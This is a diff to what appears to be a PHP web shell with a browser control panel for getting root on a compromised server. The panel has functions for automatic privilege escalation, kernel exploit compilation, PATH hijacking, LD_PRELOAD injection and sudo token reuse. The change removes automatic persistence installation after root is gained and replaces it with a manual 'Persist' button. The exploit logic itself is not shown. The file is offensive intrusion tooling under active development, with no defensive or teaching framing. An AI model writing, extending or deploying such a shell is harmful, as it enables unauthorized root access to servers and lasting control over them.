@@ -3310,7 +3310,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2137</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2215</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -6273,17 +6273,18 @@ async function autoGetRoot() {
         }
     }
     
-    // Phase 4: Verification & Persistence
+    // Phase 4: Verification
     if (rootObtained) {
         statusDiv.innerHTML = `
             <div style="padding:10px;">
                 <div style="color:#0f0;font-weight:bold;">✅ Phase 4/4: ROOT CONFIRMED</div>
-                <div style="color:#888;font-size:11px;margin-top:5px;">Installing persistence mechanisms...</div>
+                <div style="color:#ff0;font-size:11px;margin-top:5px;">⚠️ Persistence NOT auto-installed</div>
+                <div style="color:#6cf;font-size:10px;margin-top:5px;">Click 🔒 Persist button to install manually</div>
                 <div style="margin-top:8px;">🔄 📝 🔑 🐚</div>
             </div>
         `;
         log('\n[*] =========================================');
-        log('[*] Phase 4/4: VERIFICATION & PERSISTENCE');
+        log('[*] Phase 4/4: VERIFICATION');
         log('[*] =========================================\n');
         
         // Comprehensive verification
@@ -6292,16 +6293,21 @@ async function autoGetRoot() {
         btn.innerHTML = '✅ ROOT OBTAINED';
         btn.style.background = 'linear-gradient(135deg, #0f0, #0a0)';
         statusDiv.className = 'privesc-status success';
-        statusDiv.innerHTML = '🎉 ROOT OBTAINED! Installing persistence...';
-        
-        // Install persistence
-        await installPersistenceWithLog();
+        statusDiv.innerHTML = `
+            <div style="padding:10px;">
+                <div style="color:#0f0;font-weight:bold;">🎉 ROOT OBTAINED!</div>
+                <div style="color:#ff0;font-size:11px;margin-top:5px;">⚠️ Persistence NOT auto-installed</div>
+                <div style="color:#6cf;font-size:10px;margin-top:5px;">Click 🔒 Persist button to install manually</div>
+            </div>
+        `;
         
         log('\n[*] =========================================');
         log('[*] ✅ BRUTAL AUTO-ROOT COMPLETE!', 'success');
         log('[*] Total attempts: ' + attempts);
+        log('[*] Note: Persistence not auto-installed', 'info');
+        log('[*] Click "🔒 Persist" button to install manually');
         log('[*] =========================================');
-        addPrivescLog('✅ BRUTAL ROOT COMPLETE!', 'success');
+        addPrivescLog('✅ BRUTAL ROOT COMPLETE! (No persistence)', 'success');
     } else {
         log('[!] ❌ ALL EXPLOITS FAILED', 'error');
         log('[*] Try manual exploitation with kernel exploits or custom payloads.\n');
@@ -6610,9 +6616,9 @@ async function kernelAutoCompile() {
             if (isReallyRoot) {
                 outputDiv.innerHTML += '\n\n<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED! (Verified)</span>\n';
                 outputDiv.innerHTML += '<span style="color:#0f0;">uid=0(root) confirmed</span>\n';
+                outputDiv.innerHTML += '\n<span style="color:#ff0;">⚠️ Persistence NOT auto-installed. Click 🔒 Persist to install.</span>\n';
                 statusDiv.className = 'privesc-status success';
-                statusDiv.innerHTML = '✅ ROOT OBTAINED via ' + targetCve;
-                await installPersistenceWithLog();
+                statusDiv.innerHTML = '✅ ROOT OBTAINED via ' + targetCve + ' (No persistence)';
             } else {
                 outputDiv.innerHTML += '\n\n<span style="color:#f44;">[!] Exploit ran but no root access</span>\n';
                 outputDiv.innerHTML += '<span style="color:#888;">Current user: ' + verifyHtml.substring(0, 200) + '</span>\n';
@@ -6663,7 +6669,7 @@ async function hijackPathAttack() {
                     if (isRoot) {
                         outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
                         outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
-                        await installPersistenceWithLog();
+                        outputDiv.innerHTML += '<span style="color:#ff0;">⚠️ Persistence NOT auto-installed. Click 🔒 Persist to install.</span>\n';
                         return;
                     } else {
                         // Show actual user for debugging
@@ -6715,7 +6721,7 @@ async function ldPreloadAttack() {
                 if (isRoot) {
                     outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
                     outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
-                    await installPersistenceWithLog();
+                    outputDiv.innerHTML += '<span style="color:#ff0;">⚠️ Persistence NOT auto-installed. Click 🔒 Persist to install.</span>\n';
                 } else {
                     outputDiv.innerHTML += '<span style="color:#f44;">[!] LD_PRELOAD injected but no root</span>\n';
                 }
@@ -6762,7 +6768,7 @@ async function sudoTokenAttack() {
             if (isRoot) {
                 outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
                 outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
-                await installPersistenceWithLog();
+                outputDiv.innerHTML += '<span style="color:#ff0;">⚠️ Persistence NOT auto-installed. Click 🔒 Persist to install.</span>\n';
             } else {
                 outputDiv.innerHTML += '<span style="color:#f44;">[!] Token reuse failed (may have expired or not root)</span>\n';
             }
